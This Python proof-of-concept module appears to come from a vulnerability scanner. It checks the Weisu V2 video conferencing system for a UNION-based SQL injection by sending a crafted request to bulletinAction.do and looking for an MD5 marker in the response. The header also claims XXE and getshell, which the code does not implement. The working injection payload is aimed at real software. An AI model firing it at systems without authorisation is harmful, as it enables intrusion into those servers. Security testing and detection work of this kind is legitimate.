#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: V2视频会议系统某处SQL注射、XXE漏洞(可getshell)
referer: http://www.wooyun.org/bugs/wooyun-2015-0143276
author: Lucifer
description: 威速V2视频会议系统存在Union注入和XXE漏洞,可GETSHELL。
'''
import sys
import json
import requests
import warnings
sys.path.append('../../')
from color import *

class v2Conference_sqli_xxe:
    def __init__(self, url):
        self.url = url

    def run(self):
        headers = {
            "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
            }

        vulnurl = self.url + r"/Conf/jsp/systembulletin/bulletinAction.do?operator=details&sysId=-1%20UnIoN%20SeLeCt%201,Md5(1234),3,Md5(1234),5%23"
        try:
            req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
            if r"81dc9bdb52d04dc20036dbd8313ed055" in req.text:
                printGreen("[+]Success:存在V2 ConferenceSQL注入漏洞...(高危)\tpayload: "+vulnurl)
            else:
                printBlue("[-]Info:不存在v2Conference_sqli_xxe漏洞")

        except:
            printYellow("[-]Warning:"+self.__class__.__name__+" ==>可能不存在漏洞")

if __name__ == "__main__":
    warnings.filterwarnings("ignore")
    testVuln = v2Conference_sqli_xxe(sys.argv[1])
    testVuln.run()